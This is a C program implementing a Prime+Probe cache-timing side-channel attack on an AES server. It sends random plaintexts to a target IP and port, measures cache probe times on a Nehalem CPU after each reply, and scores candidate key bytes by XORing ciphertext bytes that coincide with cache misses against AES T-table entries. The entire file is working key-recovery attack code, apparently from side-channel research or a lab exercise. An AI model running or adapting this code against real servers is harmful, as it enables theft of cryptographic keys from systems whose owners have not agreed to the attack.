#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/mman.h>
#include "ctattack.h"

#include <math.h>

#define RAM_ACCESS_TIME_EMPIRICAL 1000
#define REPS 100
#define CIPHERTEXTS 200000

int main(int argc, char* argv[])
{

    char *ip_str;
    int server_port;
    int socket_desc;
    struct sockaddr_in server;
    unsigned char message[16], server_reply[16];
    int times[REPS];
    FILE *fp;
    int i;
    int count = 0;
    int X[256], Y[256], K[256];


    nehalem_setup(0x38c7b91a0);

    for (i = 0; i < REPS; ++i) {
        times[i] = 0;
    }

    for (i = 0; i < 256; ++i) {
        X[i] = 0;
        Y[i] = 0;
        K[i] = 0;
    }


    if ((argc != 3) && (argc != 4)) {
        printf("[!]Usage: %s IP PORT [OUTFILE default: data.csv]\n", argv[0]);
        return 1;
    }
    ip_str = argv[1];
    server_port = atoi(argv[2]);
    server.sin_addr.s_addr = inet_addr(ip_str);
    server.sin_family = AF_INET;
    server.sin_port = htons( server_port );





    unsigned long int min_prob_time;
    unsigned long int prob_time;
    int c = 0;


    for (count = 0; count < CIPHERTEXTS; ++count) {

        min_prob_time = 99999999;

        //message[0] = '\0';
        for (i = 0; i < 16; ++i) {
            message[i] = (unsigned char)rand()%256;
        }


        for (i = 0; i < REPS; ++i) {
            socket_desc = socket(AF_INET, SOCK_STREAM, 0);
            if (socket_desc == -1) { printf("Could not create socket\n"); return 1; } //printf("socket_desc: %d\n", socket_desc);
            
            //Connect to remote server
            if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");

            nehalem_prime();
            nehalem_reprime();

            //message = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
            //message = "aaaabbbbccccdddd";
            if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
            if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }

            prob_time = nehalem_probe();

            if (min_prob_time > prob_time) {
                min_prob_time = prob_time;
            }

            close(socket_desc);

        }


        if (min_prob_time < 900) {
            c++;
            //printf("%d\n", (unsigned int)server_reply[0]);
            X[(unsigned int)server_reply[0]] += 1;
        }
        Y[(unsigned int)server_reply[0]] += 1;


/*
        printf("%d: %03d", count, server_reply[0]);
        for (i = 1; i < 16; ++i) {
            printf(":%03d", server_reply[i]);
        }
        printf("\t%lu\n", min_prob_time);
*/
    }




    int TeN = 0;
    
    for (i = 0; i < 256; ++i) {
        if (X[i] < 1) {
            for (int j = 0; j < 16; ++j) {
                TeN = (get_TeN_idx(4, j/4) & (0xFF<<(j%4)*8) ) >> (j%4)*8;
                //printf("i=%d\txor\tTe0=%d\t->\t%d\n", i, TeN, i^TeN);
                K[i ^ TeN] += 1;
            }
        }
        //printf("%x\n", get_TeN_idx(0, i));
    }

    for (int i = 0; i < 256; ++i) {
        printf("X[%d]/Y[%d]\t=\t%d/%d\t%f\t\t", i, i, X[i], Y[i], (float)X[i]/Y[i]);
        printf("K[%d]=K[0x%02x]\t=\t%d\n", i, i, K[i]);
    }











// STATISTICS

    int Number = REPS;
    float Mean, Variance, SD, Sum=0, Differ, Varsum=0;
    int min=999999, max=0;
    int minarg=-1, maxarg=-1;


    for(i=0; i<Number; i++)
    {
        Sum = Sum + X[i];
    }


    for(i=0; i<256; i++)
    {
        if (K[i] < min) {
            min = K[i];
            minarg = i;
        }
        if (K[i] > max) {
            max = K[i];
            maxarg = i;
        }
    }

  
    Mean = Sum /(float)Number;
 
    for(i=0; i<Number; i++)
        {
        Differ = X[i] - Mean;
        Varsum = Varsum + pow(Differ,2);
    }
  
    Variance = Varsum / (float)Number;
    SD = sqrt(Variance);
  
    printf("Mean               = %.2f\n", Mean);
    printf("Varience           = %.2f\n", Variance);
    printf("Standard deviation = %.2f\n", SD);
    printf("Max K              = %d\n", max);
    printf("Maxarg K           = %d - %02x\n", maxarg, maxarg);
    printf("Min K              = %d\n", min);
    printf("Minarg K           = %d\n", minarg);

    printf("Miss Count         = %d\n", c);




// EXPORTING


    char dir[256];

    if (argc == 3) {
        sprintf(dir, "%s", "data.csv");
    } else {
        sprintf(dir, "%s", argv[3]);
    }
    

    fp = fopen((const char*)dir, "w");

    for (i = 0; i < REPS; ++i) {
        fprintf(fp, "%d\n", X[i]);
    }

    fclose(fp);




    return 0;
}



